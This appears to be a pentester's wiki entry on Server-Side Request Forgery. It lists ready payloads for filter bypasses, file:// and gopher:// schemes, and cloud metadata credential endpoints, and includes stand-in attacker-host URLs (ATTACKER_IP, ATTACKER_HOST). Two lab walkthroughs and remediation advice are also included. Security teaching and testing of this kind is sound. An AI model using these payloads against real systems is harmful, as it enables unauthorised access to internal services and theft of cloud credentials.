---
type: technique
title: Server-Side Request Forgery (SSRF)
lang: en
status: active
wstg: ["WSTG-INPV-19"]
owasp_top10: ["A10:2021"]
owasp_api: []
asvs: ["V1.3.6"]
cwe: ["CWE-918"]
attack: []
cvss: ""
sources: [web-200-oswa, pg-fullmoon, payloadsallthethings, hacktricks]
updated: 2026-09-17
---

# Server-Side Request Forgery (SSRF)

**TL;DR** — A feature that fetches a URL can be pointed at targets the attacker can't reach
directly — loopback, internal services, cloud metadata — turning the server into a proxy.
Some schemes (`file://`, `gopher://`) extend it to file read and raw TCP.

> Framework: **A10:2021 – SSRF**, `CWE-918`. WSTG + ASVS IDs in frontmatter (WSTG 4.2 / ASVS 5.0, verified).

## Where it applies

Anything that takes a URL/host server-side: import-from-URL, avatar/image "from URL",
link/URL preview, webhooks, PDF/screenshot renderers, feed/RSS readers, document
converters, and proxy endpoints.

## How it works

The server issues the request, so it inherits the server's network position and any
implicit trust internal services grant to callers. Targets:

```
http://127.0.0.1:PORT/         # loopback services not exposed externally
http://169.254.169.254/…       # cloud instance metadata (creds/tokens)
http://internal-host/…         # back-end APIs, admin panels
file:///etc/passwd             # local file read (if the fetcher allows the scheme)
gopher:// dict://              # craft arbitrary TCP payloads (e.g. to Redis)
```

## Testing

Point the URL at **your** host and watch your access log / listener:

1. Submit `http://ATTACKER_IP/fromurl` and check for the inbound request — a hit confirms
   the server fetches attacker-controlled URLs (works even when the response isn't shown,
   i.e. **blind** SSRF).
2. If a response *is* reflected or stored, pivot to internal targets and read them back.
3. Try alternate schemes (`file://`, `gopher://`) and metadata IPs.

## Exploitation

Internal service enumeration, reading cloud metadata (often IAM credentials), reaching
unauthenticated internal admin/microservice endpoints, and — with `file://` — local file
disclosure. Reachable also from [[xxe]] (external entity → `http://`).

## Cloud metadata & filter bypasses

High-value targets and common evasions:

- **AWS** `http://169.254.169.254/latest/meta-data/` (IMDSv1); IMDSv2 needs the
  `X-aws-ec2-metadata-token` header — usable only if the fetcher lets you set headers.
- **GCP** `http://metadata.google.internal/computeMetadata/v1/` (`Metadata-Flavor: Google`).
- **Azure** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (`Metadata: true`).
- **Bypasses:** alternate loopback spellings (`http://0.0.0.0/`, `http://[::]/`, `http://127.1/`,
  trailing-dot `http://localhost./`) — a naive denylist that blocks only the literal strings
  `localhost`/`127.0.0.1` misses all of these; decimal/hex/octal IP encodings
  (`http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1/`); credential/fragment
  confusion (`http://allowed@127.0.0.1/`, `http://127.0.0.1#allowed`); DNS rebinding (a name
  that resolves external→internal between the check and the fetch); and open redirects on an
  allowlisted host ([[open-redirect]]).

Confirm blind SSRF with [[burp-suite|Burp]] Collaborator; reproduce with [[curl]].

## Payload library

Inert; keep OOB/exfil hosts generic. Fuller set: [[payloadsallthethings|PaTT]] + [[hacktricks]].

**Loopback / internal spellings** (defeat naive string denylists):

```text
http://127.0.0.1/   http://localhost/   http://0.0.0.0/   http://[::]/   http://[::1]/
http://127.1/   http://127.0.1/   http://0/   http://127.127.127.127/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

**IP encoding** — decimal / hex / octal (same host, unseen by string filters):

```text
http://2130706433/     # 127.0.0.1 decimal
http://0x7f000001/     # 127.0.0.1 hex
http://0177.0.0.1/     # 127.0.0.1 octal
http://2852039166/     # 169.254.169.254 decimal (AWS metadata)
```

**Parser confusion / allowlist bypass** (userinfo, fragment, redirect hosts):

```text
http://allowed.com@127.0.0.1/
http://127.0.0.1#allowed.com/
http://127.1.1.1:80\@127.2.2.2:80/
http://company.127.0.0.1.nip.io/     # DNS name → 127.0.0.1
http://localtest.me/                 # → 127.0.0.1
```
Also: DNS rebinding (name flips external→internal between the check and the fetch) and an
open redirect on an allowlisted host ([[open-redirect]]).

**Non-HTTP schemes** (extend SSRF to file read / raw TCP):

```text
file:///etc/passwd
dict://127.0.0.1:6379/info                              # probe Redis/services
gopher://127.0.0.1:6379/_<url-encoded commands>         # arbitrary TCP — Gopherus generates
ftp://ATTACKER_HOST/   sftp://ATTACKER_HOST:11111/   ldap://127.0.0.1:389/
```

### Cloud instance-metadata endpoints (the high-value target)

| Provider | Endpoint | Header / note |
|---|---|---|
| **AWS IMDSv1** | `http://169.254.169.254/latest/meta-data/` · `.../iam/security-credentials/<role>` · `.../latest/user-data` | none — any GET SSRF |
| **AWS IMDSv2** | PUT `.../latest/api/token` → GET with it | `X-aws-ec2-metadata-token`; hop-limit 1 |
| **AWS ECS / Lambda** | `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` · Lambda: `file:///proc/self/environ` | creds in env |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` |
| **Azure** | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | `Metadata: true` |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1.json` | none |
| **Alibaba** | `http://100.100.100.200/latest/meta-data/` | none |
| **Oracle Cloud** | `http://169.254.169.254/opc/v2/instance/` | `Authorization: Bearer Oracle` |

AWS-IMDSv2 / GCP / Azure reject `X-Forwarded-For` and require their header — reachable only if
the fetcher lets you set request headers.

## Worked example — Group Office

From [[web-200-oswa]] (authenticated). Two vectors surface; the strong one is the **profile
picture "from URL"** upload: `POST /api/upload` takes a **`url`** parameter that the server
fetches and stores as a blob. Submitting `url=http://ATTACKER_IP/fromurl` produces a hit in
Kali's access log — SSRF confirmed. The stored response is retrievable: the request returns
a `blobId`, and `/api/download.php?blob=<id>` (or `/api/thumb.php`) serves the fetched
content back. Changing `url` to **`file:///etc/passwd`** then makes the server read a local
file into a blob, which is downloaded the same way — SSRF escalated to local file read.

## Worked example — Fullmoon (0.0.0.0 bypass + SSRF-over-IDOR)

From [[pg-fullmoon]] (OffSec PG box). A "website analysis" feature screenshots a user-supplied
URL via a headless Chromium. The denylist rejects only literal `localhost` / `127.0.0.1`, so
**`http://0.0.0.0/`** reaches loopback. Screenshots are saved to a predictable path — an
[[idor]]: `.../fullmoon-demo-screenshots-<N>.png`, iterable with [[ffuf]]. Direct access to
some returns `403 Access denied`, but the screenshot feature can be pointed at *those* internal
screenshot URLs — the app screenshots the screenshots you can't reach — leaking an **admin
password** off one of them. Login → `local.txt`. A clean SSRF→IDOR chain.

## Confirming impact

Show a request originating from the server to a target the client can't reach (your
listener, an internal host, metadata IP), and ideally read the response (internal data,
metadata credentials, or a local file). Impact ranges Medium→Critical (cloud metadata creds
are typically Critical).

## Remediation

- **Allowlist** destination hosts/schemes; deny by default. Block loopback, RFC-1918/private
  ranges, link-local `169.254.0.0/16`, and unused schemes (`file`, `gopher`, `dict`).
- Resolve the hostname and validate the **resolved IP** (defeat DNS-rebinding / redirects);
  disable following redirects to disallowed hosts.
- Don't reflect raw fetched responses; require auth on internal services (defence in depth).

## Quick checklist

- [ ] Any server-side URL fetch? import-from-URL, avatar-from-URL, webhook, preview, PDF/screenshot, proxy.
- [ ] Point at **your** listener → inbound hit confirms SSRF (works blind).
- [ ] Loopback blocked? → `0.0.0.0` / `[::]` / decimal-hex-octal IP / `@`-userinfo / `nip.io`.
- [ ] Reachable? → enumerate internal ports, then **cloud metadata** (creds) and internal admin APIs.
- [ ] Response hidden? → blind via Collaborator; can you set headers (IMDSv2/GCP/Azure) or use `gopher`/`dict`/`file`?

## See also

[[xxe]] · [[directory-traversal]] · [[open-redirect]] · [[burp-suite]] · [[web-app-assessment]]

*Sources: [[web-200-oswa]] module 14 (Group Office); [[pg-fullmoon]] (0.0.0.0 bypass, SSRF→IDOR chain); [[payloadsallthethings]] + [[hacktricks]] (bypass library, cloud-metadata table).*
